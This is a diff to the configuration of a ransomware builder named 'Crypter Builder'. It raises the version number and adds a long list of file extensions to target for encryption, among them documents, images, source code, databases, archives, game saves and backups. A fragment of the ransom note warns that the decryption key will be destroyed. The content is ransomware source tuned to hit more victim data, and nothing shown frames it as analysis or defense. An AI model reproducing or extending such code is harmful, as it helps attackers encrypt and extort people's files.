@@ -10,7 +10,7 @@ from ordereddict import OrderedDict
 
 ## VERSION
 MAJ_VERSION = "2"
-MIN_VERSION = "20"
+MIN_VERSION = "25"
 
 # TITLE
 TITLE = "Crypter Builder v%s.%s" % (MAJ_VERSION, MIN_VERSION)
@@ -41,25 +41,30 @@ If you fail to take action within this time window, the decryption key will be d
 ## DEFAULT FILETYPES TO ENCRYPT
 ENCRYPTABLE_FILETYPES = [
     # GENERAL FORMATS
-    "sln",
-
+    "dat", "keychain", "sdf", "vcf",
     # IMAGE FORMATS
-    "jpg", "png", "tiff", "tif", "gif", "jpeg", "jif", "jfif", "jp2", "jpx", "j2k", "j2c", "fpx", "pcd", "bmp", "svg"
-
+    "jpg", "png", "tiff", "tif", "gif", "jpeg", "jif", "jfif", "jp2", "jpx", "j2k", "j2c", "fpx", "pcd", "bmp", "svg",
+    "3dm", "3ds", "max", "obj", "dds", "psd", "tga", "thm", "tif", "tiff", "yuv", "ai", "eps", "ps", "svg", "indd",
+    "pct",
     # VIDEO FORMATS
-    "mp4", "avi", "mkv",
-    
+    "mp4", "avi", "mkv", "3g2", "3gp", "asf", "flv", "m4v", "mov", "mpg", "rm", "srt", "swf", "vob", "wmv",
     # DOCUMENT FORMATS
-    "doc", "docx", "txt", "pdf",
-
+    "doc", "docx", "txt", "pdf", "log", "msg", "odt", "pages", "rtf", "tex", "wpd", "wps", "csv", "ged", "key", "pps",
+    "ppt", "pptx", "xml", "json", "xlsx", "xlsm", "xlsb", "xls", "mht", "mhtml", "htm", "html", "xltx", "prn", "dif",
+    "slk", "xlam", "xla", "ods", "docm", "dotx", "dotm", "xps", "ics",
     # SOUND FORMATS
-    "mp3",
-
-    # EXE FORMATS
-    "exe", "msi", "php",
-
+    "mp3", "aif", "iff", "m3u", "m4a", "mid", "mpa", "wav", "wma",
+    # EXE AND PROGRAM FORMATS
+    "msi", "php", "apk", "app", "bat", "cgi", "com", "asp", "aspx", "cer", "cfm", "css", "htm", "html",
+    "js", "jsp", "rss", "xhtml", "c", "class", "cpp", "cs", "h", "java", "lua", "pl", "py", "sh", "sln", "swift",
+    "vb", "vcxproj",
+    # GAME FILES
+    "dem", "gam", "nes", "rom", "sav",
     # COMPRESSION FORMATS
-    "tgz", "zip", "rar"
+    "tgz", "zip", "rar", "tar", "7z", "cbr", "deb", "gz", "pkg", "rpm", "zipx", "iso",
+    # MISC
+    "ged", "accdb", "db", "dbf", "mdb", "sql", "fnt", "fon", "otf", "ttf", "cfg", "ini", "prf", "bak", "old", "tmp",
+    "torrent"
     ]
 
 
